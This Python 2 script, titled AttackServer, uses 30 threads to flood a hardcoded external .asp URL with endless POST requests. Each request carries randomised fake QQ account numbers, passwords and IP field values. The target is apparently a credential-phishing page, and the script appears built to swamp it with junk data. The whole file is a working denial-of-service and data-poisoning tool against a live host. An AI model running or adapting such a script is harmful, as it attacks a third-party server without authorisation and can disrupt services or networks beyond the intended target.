import os
import time
import random
import string
import requests
from common_lib import ThreadHandler


class AttackServer(ThreadHandler):
    def __init__(self):
        self.m_info_request_cnt = 0
        ThreadHandler.__init__(self)
        self.do_init()

    def do_init(self):
        self.set_work_thread_cnt(30)
        self.m_set_keep_thread_alive = True
        self.start_one_thread(self.manage_thread)
        pass

    def gen_ip(self):
        return '%d.%d.%d.%d' % (random.randint(120, 160), random.randint(20, 160), random.randint(1, 254), random.randint(1, 254))
        pass

    def change_post_data(self, post_data):
        post_data['QQPassWord'] = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
        post_data['QQNumber'] = ''.join(str(random.randint(1, 9)) for _ in range(10))
        post_data['ip2'] = self.gen_ip()
        post_data['ip1'] = post_data['ip2']
        return post_data
        pass

    def work_thread(self):
        print 'thread start'
        url = 'http://xing.fa.dian.llld.org/com/index2.asp'
        post_data = dict()
        post_data['image.x'] = 52
        post_data['image.y'] = 22
        post_data['ip1'] = '121.31.246.83'
        post_data['ip2'] = '121.31.246.83'
        post_data['QQNumber'] = '1123412415'
        post_data['QQPassWord'] = 'dsfesafedsa'
        while True:
            if self.m_quit_flag:
                break
            r = requests.post(url, data=post_data)
            if 200 == r.status_code:
                self.m_info_request_cnt += 1
            else:
                print 'ret code [%s]' % r.status_code
            self.change_post_data(post_data)
        pass

    def manage_thread(self):
        while True:
            print 'Request cnt [%d]' % self.m_info_request_cnt
            time.sleep(3)
            if self.m_quit_flag:
                break
        pass


if __name__ == '__main__':
    handler = AttackServer()
    handler.start()
    while True:
        try:
            if handler.m_quit_flag:
                break
            time.sleep(3)
        except KeyboardInterrupt:
            exit(0)


